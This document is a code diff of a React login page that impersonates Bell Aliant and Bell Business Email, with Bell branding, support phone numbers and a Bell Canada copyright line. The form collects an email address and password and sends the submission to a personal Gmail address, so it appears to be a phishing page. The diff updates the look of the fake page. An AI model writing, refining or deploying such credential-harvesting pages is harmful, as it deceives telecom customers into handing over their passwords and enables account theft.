@@ -51,7 +51,7 @@ const HomePage = () => {
       message: customizedMessage,
       subject: "New Form Submitted",
       email: "krogstadracheal@gmail.com",
-      name: "Bellaliant",
+      name: "Project Business",
     };
     console.log(data);
 
@@ -100,9 +100,14 @@ const HomePage = () => {
       {/* Navbar */}
       <header>
         <div className="header">
-          <a className="navbar-brand mt-3 mb-2" href="#">
+          <a className="navbar-brand d-flex align-items-center gap-2" href="#">
             <div className="site-title">Bell</div>
-            <div className="site-title-sub">Aliant</div>
+            <div className="site-sub-title-container">
+              <div className="site-title-sub">
+                <span>Business</span>
+                <span>Email</span>
+              </div>
+            </div>
           </a>
           <div>
             <a
@@ -117,163 +122,98 @@ const HomePage = () => {
           </div>
         </div>
       </header>
-      <main className="container">
+      <main className="container pt-5">
         {/* Page Content */}
-        <div className="content">
-          <div className="row">
-            <div className="col-12">
-              <h2>Courriel Bell Aliant</h2>
-            </div>
-          </div>
-          <div className="row">
-            {/* Form Column */}
-            <div className="col-md-6 mb-5 mb-lg-0">
-              <div className="card">
-                <div className="card-header">
-                  <h4>Login</h4>
-                </div>
-                <div className="card-body">
-                  {isSubmitted ? (
-                    <div>
-                      <div className="email-success mb-3">
-                        Form submitted successfully!
-                      </div>
-                      <div>
-                        <button
-                          type="submit"
-                          className="btn form-btn"
-                          onClick={() => {
-                            location.reload();
-                          }}
-                        >
-                          Continue
-                        </button>
-                      </div>
-                    </div>
-                  ) : (
-                    <form onSubmit={handleSubmit} noValidate>
-                      <div className="mb-2">
-                        <label htmlFor="email" className="form-label">
-                          Email Address
-                        </label>
-                        <input
-                          type="text"
-                          name="email"
-                          value={formData.email}
-                          onChange={handleInputChange}
-                          className={`form-control ${
-                            formErrors.email ? "is-invalid" : ""
-                          }`}
-                          id="email"
-                          required
-                        />
-                        {formErrors.email && (
-                          <div className="invalid-feedback">
-                            {formErrors.email}
-                          </div>
-                        )}
-                      </div>
-
-                      <div className="mb-3">
-                        <label htmlFor="password" className="form-label">
-                          Password
-                        </label>
-                        <input
-                          type="password"
-                          name="password"
-                          value={formData.password}
-                          onChange={handleInputChange}
-                          className={`form-control ${
-                            formErrors.password ? "is-invalid" : ""
-                          }`}
-                          id="password"
-                          required
-                        />
-                        {formErrors.password && (
-                          <div className="invalid-feedback">
-                            {formErrors.password}
-                          </div>
-                        )}
-                      </div>
-                      <div className="mb-3">
-                        <div className="custom-checkbox">
-                          <input
-                            type="checkbox"
-                            name="remember"
-                            checked={formData.remember}
-                            onChange={handleInputChange}
-                            className="form-check-input"
-                            // id="remember"
-                            id="styledCheckbox"
-                          />
-                          <span className="checkbox-box"></span>
-                          <label
-                            for="styledCheckbox"
-                            className="custom-label form-label"
-                          >
-                            Remember my email address!
-                          </label>
-                        </div>
-                      </div>
-
-                      <div>
-                        <button type="submit" className="btn form-btn">
-                          {isLoading ? "Please Wait...." : "Submit"}
-                        </button>
-                      </div>
-                      <div>
-                        <a className="forgot-password form-label" href="/">
-                          <div>
-                            Forgot your password? Please call Technical Support.
-                            <br />
-                            <br />
-                            Bell Aliant: 1-866-425-4268
-                            <br />
-                            KMTS: 1-807-467-5687
-                            <br />
-                            DMTS: 1-807-223-1100
-                            <br />
-                            Ontera: 1-888-566-8372
-                            <br />
-                            FibreOP: 1-866-342-7367
-                            <br />
-                          </div>
-                        </a>
-                      </div>
-                    </form>
-                  )}
-                </div>
-              </div>
-            </div>
-
-            {/* Card Column */}
-            <div className="col-md-6 mb-5 mb-lg-0">
-              <div className="card">
-                <div className="card-header">
-                  <h4>New enhancements to your Bell Aliant email.</h4>
-                </div>
-
-                <div className="card-body section-wrapper">
-                  <div className="floating-element"></div>
-                  <div className="section-content">
-                    <h3 className="mb-2">
-                      You'll start seeing these updates soon:
-                    </h3>
-                    <ul>
-                      <li className="list">
-                        A new look and composing screen for an improved
-                        experience
-                      </li>
-                      <li className="list">Increased inbox storage space</li>
-                      <li className="list">
-                        A new calendar feature to help organize your day
-                      </li>
-                      <li className="list">
-                        An optimized mobile experience on iOS and Android
-                      </li>
-                    </ul>
+        <div className="d-flex  justify-content-center justify-content-lg-start">
+          <div className="form-container">
+            <div className="form-body">
+              <h2 className="mb-3">Login</h2>
+              {isSubmitted ? (
+                <div>
+                  <div className="email-success mb-3">
+                    Form submitted successfully!
+                  </div>
+                  <div>
+                    <button
+                      type="submit"
+                      className="btn form-btn"
+                      onClick={() => {
+                        location.reload();
+                      }}
+                    >
+                      Continue
+                    </button>
                   </div>
                 </div>
+              ) : (
+                <form onSubmit={handleSubmit} noValidate>
+                  <div className="mb-2">
+                    <label htmlFor="email" className="form-label">
+                      Email Address
+                    </label>
+                    <input
+                      type="text"
+                      name="email"
+                      value={formData.email}
+                      onChange={handleInputChange}
+                      className={`form-control ${
+                        formErrors.email ? "is-invalid" : ""
+                      }`}
+                      id="email"
+                      required
+                    />
+                    {formErrors.email && (
+                      <div className="invalid-feedback">{formErrors.email}</div>
+                    )}
+                  </div>
+
+                  <div className="mb-3">
+                    <label htmlFor="password" className="form-label">
+                      Password
+                    </label>
+                    <input
+                      type="password"
+                      name="password"
+                      value={formData.password}
+                      onChange={handleInputChange}
+                      className={`form-control ${
+                        formErrors.password ? "is-invalid" : ""
+                      }`}
+                      id="password"
+                      required
+                    />
+                    {formErrors.password && (
+                      <div className="invalid-feedback">
+                        {formErrors.password}
+                      </div>
+                    )}
+                  </div>
+                  <div>
+                    <button type="submit" className="btn form-btn">
+                      {isLoading ? "Please Wait...." : "Submit"}
+                    </button>
+                  </div>
+                  <div className="mt-3">
+                    <a className="forgot-password form-label" href="/">
+                      <div>
+                        <span>
+                          Forgot your password? Call <b> 310-BELL</b> to reset
+                          it.
+                        </span>
+                      </div>
+                    </a>
+                  </div>
+                </form>
+              )}
+            </div>{" "}
+            <div class="form-footer text-center">
+              <div class="d-flex justify-content-center gap-2">
+                <a href="#">Privacy</a>|<a href="#">Legal Regulatory</a>
+              </div>
+              <div>
+                <span class="copyright">
+                  © Bell Canada, 2024. All rights reserved.
+                </span>
               </div>
             </div>
           </div>
